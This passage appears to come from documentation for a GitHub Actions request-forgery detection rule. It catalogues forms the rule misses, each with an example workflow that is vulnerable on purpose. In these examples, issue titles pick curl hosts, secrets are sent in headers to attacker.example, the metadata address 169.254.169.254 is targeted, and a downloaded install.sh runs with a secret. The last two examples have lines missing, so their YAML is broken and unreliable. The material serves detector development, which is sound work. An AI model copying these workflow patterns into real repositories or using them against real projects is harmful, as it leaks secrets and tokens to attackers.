  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: fact)
  - example: attacker-header.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step on a GitHub-hosted runner sends a request
    #   with curl to the host the issue's title names, with a header the issue's
    #   body writes, and no credential.
    # reason: a todo (a fact): the metadata service of the runner's cloud
    #   answers a request with the header Metadata: true, and whether the
    #   response reaches the attacker was not tried.
    # cause: the rule reports a request without a credential only from a
    #   self-hosted runner.
    # attack: the attacker opens an issue titled 169.254.169.254 whose body is
    #   Metadata: true.
    # attack-run-behavior: curl sends the request with the header to the
    #   metadata service of the runner's cloud, whose answer goes to the log of
    #   the job.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: |
              curl -fsS -H "${{ github.event.issue.body }}" "http://${{ github.event.issue.title }}/metadata/instance?api-version=2021-02-01"
    ```
- hosted-no-credential: a request without a credential from a GitHub-hosted runner: the attacker's server receives nothing of the repository, and the metadata service of the runner's cloud answered 400 to a request without its header. This undetected form is only for a request whose response no step runs as code; a request whose response a step runs as code is the undetected form response-code
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: no-added-gain
  - example: hosted-no-credential.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step on a GitHub-hosted runner sends a request
    #   with curl to the host the issue's title names, without a credential.
    # reason: no added gain: the request carries nothing of the repository, and
    #   the metadata service of the runner's cloud answered 400 to a request
    #   without its header.
    # cause: the rule reports a request without a credential only from a
    #   self-hosted runner.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request without a credential to
    #   attacker.example, which learns only that the job ran.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: |
              curl -fsS "https://${{ github.event.issue.title }}/status"
    ```
- action-no-credential: an input of an action of the table in a step that gives the action no secret, in a job on a GitHub-hosted runner. This undetected form is only for an action whose response no step runs as code; an action whose response a step runs as code is the undetected form response-code
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: no-added-gain
  - example: action-no-credential.yml (workflow, undetected)
    ```yaml
    # situation: the test of CodeQL's actions/request-forgery: on issue_comment,
    #   octokit/request-action gets the comment's body as route, with no token,
    #   on a GitHub-hosted runner.
    # reason: no added gain: the action sends no credential, and the request
    #   comes from a GitHub-hosted runner.
    # cause: the rule reports an input of the action only when the step gives
    #   the action a secret, or the job runs on a self-hosted runner.
    # attack: the attacker comments GET https://attacker.example/x.
    # attack-run-behavior: the action sends the request without a token to
    #   attacker.example.
    on: issue_comment
    jobs:
      test:
        runs-on: ubuntu-latest
        steps:
          - uses: octokit/request-action@v2.x
            with:
              route: ${{ github.event.comment.body }}
    ```
- response-code: a request to the host that an attacker's value decides, whose response a step runs as code: in the same step (curl -fsS https\://\$HOST/x | bash), or in a later step (a file that curl -o writes and a later step runs, or an output of an action that the script of a later run: step contains). The server of the attacker writes the response. The rule reads the request and does not follow the response
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: response-code.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step on a GitHub-hosted runner downloads
    #   install.sh from the host that the issue's title names, without a
    #   credential, and a later step runs install.sh with a secret.
    # reason: the attacker's server writes install.sh, and bash runs install.sh
    #   with the job's secrets and token.
    # cause: the rule reads the request, which carries no credential from a
    #   GitHub-hosted runner, and does not follow the response to the step that
    #   runs it.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server whose /install.sh sends $TOKEN to the attacker.
    # attack-run-behavior: curl downloads install.sh from attacker.example, and
    #   bash install.sh in the later step runs the script of the attacker, which
    #   sends the secret DEPLOY to the server of the attacker.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - run: curl -fsS "https://$HOST/install.sh" -o install.sh
            env:
              HOST: ${{ github.event.issue.title }}
          - run: bash install.sh
            env:
              TOKEN: ${{ secrets.DEPLOY }}
    ```
- runner-unknown: a request without a credential from a job whose runs-on is neither GitHub-hosted nor self-hosted by its labels: a runner group, labels of its own, a \${{ }}
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: fact)
  - example: runner-unknown.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a job on a runner labelled linux.2xlarge sends a
    #   request with curl to the host the issue's title names, without a
    #   credential.
    # reason: a todo (a fact): a label of its own may name a self-hosted runner,
    #   whose network the request reaches.
    # cause: the rule reads a runner as self-hosted by the label self-hosted
    #   only, as self-hosted-runner does.
    # attack: the attacker opens an issue titled 10.0.0.5:8500.
    # attack-run-behavior: curl sends the request from the runner to
    #   10.0.0.5:8500, which a self-hosted runner may reach.
    on: issues
    jobs:
      j:
        runs-on: linux.2xlarge
        steps:
          - shell: bash
            run: |
              curl -fsS "https://${{ github.event.issue.title }}/status"
    ```
- shell-derived: an attacker's value the script makes: an assignment, \$( ), a function's argument (\$1), standard input
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: shell-derived.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step reads the first word of the issue's title
    #   into HOST and sends a request with curl and the secret DEPLOY_TOKEN to
    #   the host HOST names.
    # reason: a todo (the same file): HOST holds the attacker's word, so the
    #   secret goes to the attacker's host.
    # cause: the rule reads an attacker's value through ${{ }} and env, not
    #   through what the script assigns.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request with Authorization: Bearer and
    #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
    #   attacker logs the header.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          TITLE: ${{ github.event.issue.title }}
        steps:
          - run: |
              read -r HOST _ <<< "$TITLE"
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"
    ```
- file: a secret that reaches the request through a file
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: file.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step writes the secret DEPLOY_TOKEN into
    #   headers.txt and sends a request with curl to the host the issue's title
    #   names, with the headers of the file.
    # reason: a todo (the same file): the file has the secret, so the secret
    #   goes to the attacker's host.
    # cause: the rule does not follow a secret through a file.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request with Authorization: Bearer and
    #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
    #   attacker logs the header.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        steps:
          - run: |
              printf 'Authorization: Bearer %s\n' "$DEPLOY_TOKEN" > headers.txt
              curl -fsS -H @headers.txt "https://${{ github.event.issue.title }}/status"
    ```
- redirect: a fixed destination that redirects the request to another host, where curl sends the headers of -H but Authorization and Cookie, and wget sends its --header: the holder of the fixed destination decides the redirect
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: other-rule (rule: secret-exfiltration)
  - example: redirect.yml (workflow, undetected)
    ```yaml
    # situation: on push, a step sends the secret API_KEY in a header with curl
    #   -L to downloads.example.com, which may redirect the request.
    # reason: another rule: curl sends a header of -H other than Authorization
    #   and Cookie to the host of a redirect, and the holder of
    #   downloads.example.com decides the redirect; secret-exfiltration reports
    #   the request to the fixed host.
    # cause: the rule reports a destination an attacker's value decides, and the
    #   workflow writes this one.
    # attack: the attacker takes over downloads.example.com and redirects the
    #   request to attacker.example.
    # attack-run-behavior: curl follows the redirect and sends x-apikey with
    #   API_KEY to attacker.example.
    on: push
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - shell: bash
            env:
              API_KEY: ${{ secrets.API_KEY }}
            run: |
              curl -fsSL -H "x-apikey: $API_KEY" https://downloads.example.com/latest
    ```
- config-file: a credential from a file curl reads: -K, the default .curlrc, --netrc
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: limitation (decided by: run-time)
  - example: config-file.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step sends a request with curl to the host the
    #   issue's title names, with the options of the file ci/curl.conf of the
    #   repository.
    # reason: a limitation (run time): the file may hold a header with a
    #   credential, which then goes to the attacker's host.
    # cause: the rule reads the words of the command, not the files curl reads.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request with the options of
    #   ci/curl.conf, a header with a credential among them, to
    #   attacker.example.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        steps:
          - uses: actions/checkout@v4
          - run: |
              curl -fsS -K ci/curl.conf "https://${{ github.event.issue.title }}/status"
    ```
- env-file-variable: a variable a step before sets through \$GITHUB_ENV: the rule reads the variables of the workflow's env
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: env-file-variable.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step writes the first word of the issue's title to
    #   $GITHUB_ENV as HOST, and the next step sends a request with curl and the
    #   secret DEPLOY_TOKEN to the host HOST names.
    # reason: a todo (the same file): HOST has the attacker's word, so the
    #   secret goes to the attacker's host.
    # cause: the rule reads the variables of the workflow's env, not what a step
    #   before writes to $GITHUB_ENV.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request with Authorization: Bearer and
    #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
    #   attacker logs the header.
    on: issues
    jobs:
      j:
        runs-on: ubuntu-latest
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
        steps:
          - env:
              TITLE: ${{ github.event.issue.title }}
            run: |
              echo "HOST=${TITLE%%[[:space:]]*}" >> "$GITHUB_ENV"
          - run: |
              curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$HOST/status"
    ```
- param-operator: a variable with an operator that changes its value (\${X#prefix}, \${X/a/b})
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: param-operator.yml (workflow, undetected)

    ```yaml
    # situation: on issues, a step sends a request with curl and the secret
    #   DEPLOY_TOKEN to the host the first word of the issue's title names,
    #   through ${TITLE%% *}.
    # reason: a todo (the same file): the first word of the title is the
    #   attacker's, so the secret goes to the attacker's host.
    # cause: the rule does not read a variable with an operator that changes its
    #   value.
    # attack: the attacker opens an issue titled attacker.example, the host of a

    # attack-run-behavior: curl sends the request with Authorization: Bearer and
    ```

- unwalked-place: a command in a place the rule does not walk: the commands of an arm of case, \$( ) in the words of case
  - finding kinds: request-forgery.action-input, request-forgery.credential-host, request-forgery.runner-network
  - disposition: todo (needs: same-file)
  - example: unwalked-place.yml (workflow, undetected)
    ```yaml
    # situation: on issues, a step sends a request with curl and the secret
    #   DEPLOY_TOKEN to the host the issue's title names, in a $( ) in the word
    #   of case.
    # reason: a todo (the same file): the request goes to the attacker's host
    #   with the secret.
    # cause: the rule does not walk a command in the words of case.
    # attack: the attacker opens an issue titled attacker.example, the host of a
    #   server the attacker runs.
    # attack-run-behavior: curl sends the request with Authorization: Bearer and
    #   the value of DEPLOY_TOKEN to attacker.example, and the server of the
    #   attacker logs the header.
    on: issues

      j:
        runs-on: ubuntu-latest

          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}

              case "$(curl -fsS -H "Authorization: Bearer $DEPLOY_TOKEN" "https://$TITLE/status")" in
    ```
